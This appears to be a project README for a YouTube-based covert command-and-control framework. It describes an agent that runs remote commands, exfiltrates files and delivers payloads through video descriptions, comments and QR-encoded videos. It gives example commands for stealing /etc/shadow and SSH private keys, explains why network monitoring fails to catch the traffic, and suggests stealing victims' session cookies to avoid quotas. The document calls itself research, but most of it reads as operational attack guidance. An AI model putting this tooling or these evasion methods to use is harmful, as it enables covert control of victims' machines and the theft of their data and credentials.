# CTwobe - YouTube Covert Channel Framework

CTwobe is a proof-of-concept command and control framework that leverages YouTube's infrastructure as a covert communication channel. This project demonstrates how legitimate social media APIs can be weaponized for data exfiltration, command execution, and binary payload delivery while evading traditional network monitoring.

## Overview

Modern security defenses focus on detecting malicious network traffic, blocking suspicious domains, and monitoring uncommon protocols. CTwobe bypasses these controls by tunneling all C2 communications through YouTube-a platform that's whitelisted in virtually every enterprise environment and generates enormous legitimate traffic volumes that provide natural cover.

The framework implements three complementary covert channels:

1. **Bidirectional C2 via Video Descriptions** - Command transmission and basic result exfiltration
2. **Data Exfiltration via Comments** - High-volume output retrieval from target systems
3. **Binary Transfer via QR-Encoded Video** - Payload delivery and large file exfiltration

## Technical Implementation

### Architecture

**Controller (CtwobeController.py)**
- Interactive command-line interface for operator
- Issues commands by updating YouTube video descriptions
- Retrieves execution results from video comments
- Manages OAuth authentication for controller's YouTube account

**Target Agent (CtwobeTarget.py)**
- Polls designated video description every 60 seconds for new commands
- Executes received commands and posts results as comments
- Supports command execution, file upload, and payload download
- Maintains persistence through credential caching

**QRizon Module (QRizon.py)**
- Encodes arbitrary binary files into QR code video streams
- Dual QR-per-frame design maximizes data density
- Supports any file type: executables, scripts, documents, archives

### Command Interface

The agent supports three command types:

**`exec <command>`**
```bash
exec whoami
exec cat /etc/passwd
exec powershell -c Get-Process
```
Executes arbitrary shell commands on the target system and returns output via comments.

**`upload <filepath>`**
```bash
upload /etc/shadow
upload sensitive_data.zip
upload ~/.ssh/id_rsa
```
Encodes the specified file into a QR code video, uploads it as an unlisted YouTube video, and returns the video ID to the operator.

**`download <video_id>`**
```bash
download dQw4w9WgXcQ
```
Downloads the specified YouTube video, decodes the QR frames back into the original file(s), enabling in-memory payload execution or tool delivery.

## Operational Advantages

### Evasion of Network Monitoring

Traditional network security controls fail to detect CTwobe because:

**Encrypted Transport**: All communications use HTTPS to YouTube's legitimate infrastructure, making deep packet inspection ineffective.

**Trusted Domain**: YouTube (googleapis.com, youtube.com) is whitelisted in virtually all environments and generates massive legitimate traffic that provides cover.

**No Suspicious Indicators**: No connections to unknown domains, no uncommon ports, no unusual protocols-just normal HTTPS API calls.

**Behavioral Blending**: YouTube API usage patterns blend into normal user activity (video uploads, comment posting, description updates).

**No C2 Infrastructure**: No attacker-controlled servers to detect, block, or seize. The entire operation uses Google's infrastructure.

## Possible Implementations for real-world engagements

The API quota limitations can be trivially bypassed in real-world scenarios:

**Playwright/Puppeteer Approach**:
- Instead of YouTube Data API, control headless Chrome/Firefox
- Use stolen session cookies or legitimate user credentials
- Perform all actions through browser automation
- Bypasses API quotas entirely-only limited by account standing
- Even harder to detect as it generates identical traffic to legitimate browser usage

**Implementation**: An attacker would modify the agent to:
1. Extract victim's YouTube session cookies from browser
2. Use Playwright to automate video access/uploads as the authenticated user
3. Avoid API quotas while maintaining even better operational security
4. Generate perfect behavioral mimicry of legitimate user actions

## Usage

### Prerequisites

```bash
pip install google-auth-oauthlib google-auth-httplib2 google-api-python-client
pip install opencv-python qrcode pyzbar pillow yt-dlp numpy
```

### Setup

1. **Create Google Cloud Project**:
   - Enable YouTube Data API v3
   - Create OAuth 2.0 credentials
   - Download `client_secrets.json`

2. **Configure Target Agent**:
   - Edit `CtwobeTarget.py` line 198: Set `TARGET_VIDEO_ID` to your video ID
   - Run agent: `python3 CtwobeTarget.py`
   - Complete OAuth flow on first run (creates token_server.pickle)

3. **Run Controller**:
   - Run: `python3 CtwobeController.py`
   - Enter the same target video ID
   - Complete OAuth flow (creates token_client.pickle)

### Operation

**Send Command**:
```
Enter command: exec hostname
Command sent successfully!
```

**Retrieve Results**:
```
Enter command: results
=== COMMAND RESULTS ===
victim-workstation
=====================
```

**Exfiltrate File**:
```
Enter command: upload /etc/passwd
[Agent uploads QR video, returns video ID in results]

Enter command: results
=== COMMAND RESULTS ===
dQw4w9WgXcQ
=====================
```

**Deliver Payload**:
```
# First encode your payload to video
python3 QRizon.py encode -i payload.bin -o payload.mp4

# Upload to YouTube manually or via YTUpload.py
# Then send download command
Enter command: download dQw4w9WgXcQ
```

## Limitations and Considerations

- **Authentication Required**: Requires valid YouTube API credentials (or stolen cookies for browser automation variant)
- **Polling Latency**: 60-second polling interval creates command execution delay
- **Encoding Overhead**: QR video encoding is bandwidth-inefficient compared to raw transfer
- **Operational Security**: Credential forensics and behavioral analytics provide detection opportunities
- **Account Risk**: Violates YouTube Terms of Service; accounts may be suspended if detected

These limitations are inherent to the covert channel approach and represent the trade-off between stealth and efficiency. For attackers with patience and proper operational security, these constraints are acceptable given the evasion benefits.

## Research and Educational Value

CTwobe demonstrates:
- **Modern Covert Channels**: How legitimate APIs become attack infrastructure
- **Defense Evasion**: Limitations of network-based security controls
- **Detection Strategies**: Importance of endpoint visibility and behavioral analytics
- **Cloud Security**: Risks of OAuth credential compromise and API abuse

---

*Developed for security research purposes. Usage without proper authorization is prohibited.*
